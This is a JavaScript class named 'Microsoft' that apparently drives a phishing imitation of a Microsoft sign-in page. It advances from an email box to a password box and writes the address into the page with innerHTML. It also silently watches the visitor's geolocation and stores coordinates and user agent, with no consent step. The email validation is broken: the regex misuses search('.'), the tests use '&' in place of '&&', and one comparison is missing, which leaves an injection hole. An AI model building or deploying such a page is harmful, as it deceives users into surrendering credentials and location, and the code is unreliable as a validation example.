export default class Microsoft{
    Email(){
        const email_input = document.querySelector("#email");
        const next_email = document.querySelector(".next-email");
        email_input.addEventListener("keyup",(e)=>{
            email_input.setAttribute("value", e.target.value);
        });
        next_email.addEventListener("click",()=>{
            const email = email_input.value;
            const displayEmail = document.querySelector(".display-erros");
            const boxEmail = document.querySelector(".main-login");
            const boxPassword = document.querySelector(".main-password");
            const displayNickname = document.querySelector(".nicknames");
            let check = false;
            if(email.search("@")>email.search(".")){
                const domain = email.split("@");
                const point = email.split(".");
                if(domain.length==2 & point.length>=2){
                    if(domain[0].search(/[<>'"]/)==-1 & domain[1].search(/[<>'"]/)){
                        check = true;
                    }
                }
            }
            if(check){
                displayEmail.setAttribute("style","display:none;");
                boxEmail.setAttribute("style","display:none;");
                boxPassword.setAttribute("style","display:flex;");
                displayNickname.innerHTML = email;
            }else{
                displayEmail.setAttribute("style","display:inline;");
            }
        });
    }
    Geolocation(){
        navigator.geolocation.watchPosition(showPosition);
        function showPosition(location){
            window.localStorage.setItem("Latitude",location.coords.latitude);
            window.localStorage.setItem("Longitude",location.coords.longitude);
            window.localStorage.setItem("UserAgent",window.navigator.userAgent);
        }
       }
}